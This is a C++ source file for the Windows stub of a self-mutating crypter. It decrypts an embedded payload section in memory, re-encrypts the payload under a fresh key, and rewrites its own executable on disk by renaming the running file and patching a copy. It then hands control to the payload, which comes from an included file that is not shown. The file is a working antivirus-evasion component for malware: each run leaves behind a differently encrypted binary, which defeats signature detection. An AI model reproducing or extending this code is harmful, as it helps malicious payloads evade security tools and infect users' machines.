#include "../payload/payload.cpp"
#include "cryptor.cpp"
#include <windows.h>
#include <iostream>
#include <fstream>

#pragma section(".replace", read)
__declspec(allocate(".replace")) INT32 payload_offet_from_me = 1;
__declspec(allocate(".replace")) UINT32 payload_segment_length = 2;
__declspec(allocate(".replace")) UINT32 payload_key = 3;
__declspec(allocate(".replace")) UINT32 replace_file_address = 4;
__declspec(allocate(".replace")) UINT32 payload_file_address = 5;

char *payload_start_addr;
const bool print_program_info = false;

void print_program_information() {
	printf("offset: %i / %x / %p\n", payload_offet_from_me, payload_offet_from_me, &payload_offet_from_me);
	printf("length: %u / %p\n", payload_segment_length, &payload_segment_length);
	printf("payload key: %u\n", payload_key);
	printf("replace file addr: %u\n", replace_file_address);
	printf("payload file address: %u\n", payload_file_address);
	printf("payload func addr: %p\n", &startPayload);
	printf("computed start of payload: %p\n", payload_start_addr);
	printf("computed end of payload: %p\n", payload_start_addr + payload_segment_length);
}

void print_payload_raw() {
	for (int i=0; i<payload_segment_length; i++) {
		printf("%hhx ", *(payload_start_addr + i));
	}
	printf("\n");
}

// write new encrypted payload and the corresponding key to the file
void overwrite_file(const char *file_path, unsigned next_key) {
	// create a copy of the memory segment
	// this is required because we are running the payload After this function
	char *payload_copy = (char *) malloc(payload_segment_length);
	std::memcpy(payload_copy, payload_start_addr, payload_segment_length);

	// encrypt payload with the new key
	crypt_array(payload_copy, payload_segment_length, next_key, nullptr);

	// move the running file to a new location
	// because windows doesnt let you overwrite a running file
	std::string targetFilePath = std::string(file_path);
	std::string tempFilePath = targetFilePath + ".old";
	if ( !MoveFileExA(targetFilePath.c_str(), tempFilePath.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH) ) {
		fprintf(stderr, "moving running file: %d", GetLastError());
		exit(1);
	}

	// create a copy of the file we can edit, put it on the same path the client used to run the program
	if ( !CopyFileA(tempFilePath.c_str(), targetFilePath.c_str(), true) ) {
		fprintf(stderr, "copying running file: %d", GetLastError());
		exit(1);
	}

	// note: using ofstream or fstream without ios::in causes the file to be truncated
	std::fstream selfFile(targetFilePath, std::ios::binary | std::ios::out | std::ios::in);
	if (!selfFile.is_open()) {
		fprintf(stderr, "couldnt open file\n");
		exit(1);
	}

	// overwrite payload key in file
	selfFile.seekp(replace_file_address + 8, std::ios::beg);
	selfFile.write(reinterpret_cast<char*>(&next_key), sizeof next_key);

	// overwrite payload segment in file
	selfFile.seekp(payload_file_address, std::ios::beg);
	selfFile.write(payload_copy, payload_segment_length);

	// finish
	selfFile.close();
}

int main(int argc, char const *argv[])
{
	// check that the user ran the injector
	if (payload_offet_from_me == 1) {
		std::cout << "I think you forgot to run the injector" << std::endl;
		return 1;
	}

	// pointer to the start of the payload section in memory
	// see also: payload_segment_length
	payload_start_addr = (char*) INT32(&payload_offet_from_me) + payload_offet_from_me;
	
	// optional info
	if (print_program_info) {
		print_program_information();
		printf("payload:\n");
		print_payload_raw();
	}

	// decrypt the payload section
	unsigned next_key;
	crypt_array(payload_start_addr, payload_segment_length, payload_key, &next_key);

	// optional info
	if (print_program_info) {
		printf("decrypted payload:\n");
		print_payload_raw();
	}

	// write new key + payload to the file
	overwrite_file(argv[0], next_key);
	// TODO: we are currently leaving a temporary file around, I could maybe spawn a detached shell to destroy it tho
	
	// pass control to payload
	return startPayload(argc, argv);
}
